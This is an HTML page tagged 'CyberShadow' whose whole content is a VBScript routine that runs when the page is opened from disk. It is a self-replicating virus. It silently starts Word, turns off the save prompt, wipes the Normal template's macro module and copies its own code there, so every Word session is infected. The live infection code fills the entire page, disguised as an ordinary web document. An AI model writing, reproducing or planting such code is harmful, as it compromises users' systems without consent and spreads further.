<html> <CyberShadow>
<BODY>
<script language="VBScript"><!--
Private Sub Window_Onload
 On Error Resume Next
 If location.protocol = "file:" then
  Dim FSO
  Set FSO = CreateObject("Scripting.FileSystemObject")
  HostPath = Replace(location.href, "file:///", "")
  HostPath = Replace(HostPath, "/", "\")
  Set WordObj = GetObject("","Word.Application"): Quit = 0
  If WordObj = "" Then Set WordObj = CreateObject("Word.Application"): Quit = 1
  Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule
  If NT.Lines(1,1) <> "'<html> <CyberShadow>" then
   WordObj.Options.SaveNormalPrompt = False
   NT.DeleteLines 1, NT.CountOfLines
   NT.Addfromfile HostPath
'NT.NormalTemplate.Save
   For j = 1 to 29
    NT.ReplaceLine j, "'" + NT.Lines(j,1)
   Next
   For j = 30 to NT.CountOfLines-3
    NT.ReplaceLine j, mid(NT.Lines(j,1),2,len(NT.Lines(j,1)))
   Next
  End If
  Set NT = Nothing
  if Quit=1 then WordObj.Quit
 End if
End Sub


--></script>
</BODY>
</HTML>

